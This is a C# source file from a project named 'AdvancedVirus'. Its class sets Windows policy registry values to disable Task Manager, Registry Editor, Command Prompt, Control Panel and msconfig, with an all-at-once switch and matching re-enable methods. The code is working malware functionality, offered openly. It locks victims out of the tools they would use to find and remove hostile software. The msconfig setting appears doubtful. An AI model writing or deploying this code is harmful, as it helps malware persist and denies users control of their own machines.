using System;
using Microsoft.Win32;

namespace AdvancedVirus
{
    public class SystemRestrictionsManager
    {
        private const string POLICIES_SYSTEM_PATH = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";

        public void DisableTaskManager()
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(POLICIES_SYSTEM_PATH))
                {
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                }
                Console.WriteLine("🔒 Task Manager disabled via registry.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"⚠️ Failed to disable Task Manager: {ex.Message}");
            }
        }

        public void DisableRegistryEditor()
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(POLICIES_SYSTEM_PATH))
                {
                    key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                }
                Console.WriteLine("🔒 Registry Editor disabled via registry.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"⚠️ Failed to disable Registry Editor: {ex.Message}");
            }
        }

        public void DisableCommandPrompt()
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
                }
                Console.WriteLine("🔒 Command Prompt disabled via registry.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"⚠️ Failed to disable Command Prompt: {ex.Message}");
            }
        }

        public void DisableControlPanel()
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
                {
                    key.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
                }
                Console.WriteLine("🔒 Control Panel disabled via registry.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"⚠️ Failed to disable Control Panel: {ex.Message}");
            }
        }

        public void DisableSystemConfiguration()
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("MSConfig", 0, RegistryValueKind.DWord);
                }
                Console.WriteLine("🔒 System Configuration (msconfig) disabled via registry.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"⚠️ Failed to disable System Configuration: {ex.Message}");
            }
        }

        // Метод, который вызывает все отключения
        public void DisableAll()
        {
            DisableTaskManager();
            DisableRegistryEditor();
            DisableCommandPrompt();
            DisableControlPanel();
            DisableSystemConfiguration();
            Console.WriteLine("🔒 All system restrictions applied.");
        }

        // Методы для восстановления (по желанию)
        public void EnableTaskManager()
        {
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(POLICIES_SYSTEM_PATH, true))
                {
                    key?.DeleteValue("DisableTaskMgr", false);
                }
                Console.WriteLine("🔓 Task Manager re-enabled.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"⚠️ Failed to enable Task Manager: {ex.Message}");
            }
        }

        public void EnableRegistryEditor()
        {
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(POLICIES_SYSTEM_PATH, true))
                {
                    key?.DeleteValue("DisableRegistryTools", false);
                }
                Console.WriteLine("🔓 Registry Editor re-enabled.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"⚠️ Failed to enable Registry Editor: {ex.Message}");
            }
        }

        public void EnableCommandPrompt()
        {
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true))
                {
                    key?.DeleteValue("DisableCMD", false);
                }
                Console.WriteLine("🔓 Command Prompt re-enabled.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"⚠️ Failed to enable Command Prompt: {ex.Message}");
            }
        }

        public void EnableControlPanel()
        {
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true))
                {
                    key?.DeleteValue("NoControlPanel", false);
                }
                Console.WriteLine("🔓 Control Panel re-enabled.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"⚠️ Failed to enable Control Panel: {ex.Message}");
            }
        }

        public void EnableSystemConfiguration()
        {
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true))
                {
                    key?.DeleteValue("MSConfig", false);
                }
                Console.WriteLine("System Configuration (msconfig) re-enabled.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to enable System Configuration: {ex.Message}");
            }
        }

        public void EnableAll()
        {
            EnableTaskManager();
            EnableRegistryEditor();
            EnableCommandPrompt();
            EnableControlPanel();
            EnableSystemConfiguration();
            Console.WriteLine("All system restrictions removed.");
        }
    }
}